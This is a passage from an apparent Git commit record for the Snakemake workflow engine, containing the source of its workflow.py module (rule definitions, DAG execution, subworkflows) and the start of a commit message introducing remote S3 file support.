logger.error(str(e)) return False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n        self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}},"msg":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your 